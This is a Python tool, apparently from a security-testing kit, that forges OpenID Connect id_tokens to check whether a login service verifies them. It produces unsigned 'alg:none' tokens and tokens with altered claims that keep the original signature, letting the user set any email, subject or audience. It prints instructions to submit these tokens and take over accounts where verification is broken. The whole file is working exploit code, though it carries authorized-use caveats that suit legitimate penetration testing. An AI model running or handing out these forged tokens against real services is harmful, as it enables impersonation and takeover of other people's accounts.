#!/usr/bin/env python3
"""
idtoken_tamper.py - craft OIDC id_token test variants to probe SP-side verification (authorized only).

An SP must verify an id_token's SIGNATURE (against jwks_uri), pin `iss` and `aud`==its client_id, enforce `nonce`, and
honor `email_verified`. This builds the tokens that test those checks; YOU submit them where the SP consumes the id_token
(callback body, id_token param, hybrid flow) and see if it logs you in as the tampered identity. It does NOT sign anything
(no key) -- the point is to catch SPs that DON'T verify signatures.

Variants:
  --list                 just decode header+payload (no tampering)
  --alg-none             header alg=none, empty signature, + any --set claims       (tests: accepts unsigned?)
  --claim-swap           keep original header+signature, change payload only        (tests: verifies signature at all?)
  (default = both alg-none and claim-swap printed)

For kid / jku / x5u injection and real key-confusion signing, use ../../JWT/poc/ (this is the OIDC-claims convenience helper).

SAFE: set claims to identities you own (victim@you.test). One benign login proof, then STOP. Authorized targets only.

Usage:
  python3 idtoken_tamper.py --token "$ID_TOKEN" --list
  python3 idtoken_tamper.py --token "$ID_TOKEN" --alg-none --set email=victim@you.test --set email_verified=true --set sub=victim-sub
  python3 idtoken_tamper.py --token "$ID_TOKEN" --claim-swap --set aud=other-client-id
"""
import argparse, base64, json, sys


def b64url_decode(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def b64url_encode(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def coerce(v):
    """string 'true'/'false'/int -> proper JSON type, else keep string."""
    if v.lower() in ("true", "false"):
        return v.lower() == "true"
    if v.lstrip("-").isdigit():
        return int(v)
    return v


def parse(token):
    parts = token.split(".")
    if len(parts) < 2:
        sys.exit("[!] not a JWT (need at least header.payload)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def apply_sets(payload, sets):
    for kv in sets:
        k, _, v = kv.partition("=")
        payload[k] = coerce(v)
    return payload


def build(header, payload, sig):
    h = b64url_encode(json.dumps(header, separators=(",", ":")))
    p = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{h}.{p}.{sig}"


def main():
    ap = argparse.ArgumentParser(description="OIDC id_token tamper helper (authorized only).")
    ap.add_argument("--token", required=True, help="the id_token JWT")
    ap.add_argument("--set", action="append", default=[], metavar="claim=value",
                    help="set/override a claim (repeatable). true/false/int auto-typed. e.g. email=victim@you.test")
    ap.add_argument("--alg-none", action="store_true", help="emit an alg:none unsigned variant")
    ap.add_argument("--claim-swap", action="store_true", help="emit a claim-swapped variant keeping the original signature")
    ap.add_argument("--list", action="store_true", help="just decode and print header + payload")
    a = ap.parse_args()

    header, payload, sig = parse(a.token)

    if a.list:
        print("=== header ===");  print(json.dumps(header, indent=2))
        print("=== payload ==="); print(json.dumps(payload, indent=2))
        print(f"=== signature (b64url, {len(sig)} chars) ===\n{sig or '(none)'}")
        return 0

    do_none = a.alg_none or not (a.alg_none or a.claim_swap)
    do_swap = a.claim_swap or not (a.alg_none or a.claim_swap)

    if do_none:
        h = dict(header); h["alg"] = "none"
        p = apply_sets(dict(payload), a.set)
        tok = build(h, p, "")  # empty signature
        print("\n=== alg:none variant (tests: does the SP accept an UNSIGNED id_token?) ===")
        print(tok)

    if do_swap:
        p = apply_sets(dict(payload), a.set)
        tok = build(header, p, sig)  # keep original (now-invalid) signature
        print("\n=== claim-swap variant, original signature kept (tests: does the SP verify the signature AT ALL?) ===")
        print(tok)

    print("\n[i] Submit where the SP consumes the id_token. If it logs you in as the tampered identity, signature/aud/iss/"
          "email_verified validation is broken -> ATO. Use identities you own; one proof; then STOP.")
    print("[i] For kid/jku/x5u injection and real key-confusion signing, see ../../JWT/poc/.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
